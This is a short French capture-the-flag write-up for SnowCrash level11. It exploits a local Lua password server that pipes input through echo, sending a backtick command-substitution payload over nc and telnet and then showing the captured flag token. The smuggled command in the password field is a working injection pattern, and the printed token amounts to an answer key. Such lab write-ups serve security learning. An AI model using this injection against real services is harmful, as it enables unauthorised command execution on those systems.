# Level11

Sur le home de l'utilisateur level11, nous trouvons un fichier `level11.lua`.
```
level11@SnowCrash:~$ lua level11.lua
lua: level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	level11.lua:3: in main chunk
	[C]: ?
```
Le serveur est déjà lancé.
Dans le code nous pouvons voir que `echo` est utilisé afin de hasher le password pour faire une comparaison ulterieurement.
Ici nous pouvons utiliser telnet ou nc.
```
level11@SnowCrash:~$ nc localhost 5151
Password: `getflag > /tmp/nc11`
Erf nope..
level11@SnowCrash:~$ telnet localhost 5151
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Password: `getflag > /tmp/telnet11`
Erf nope..
Connection closed by foreign host.
level11@SnowCrash:~$ cat /tmp/nc11
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
level11@SnowCrash:~$ cat /tmp/telnet11
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
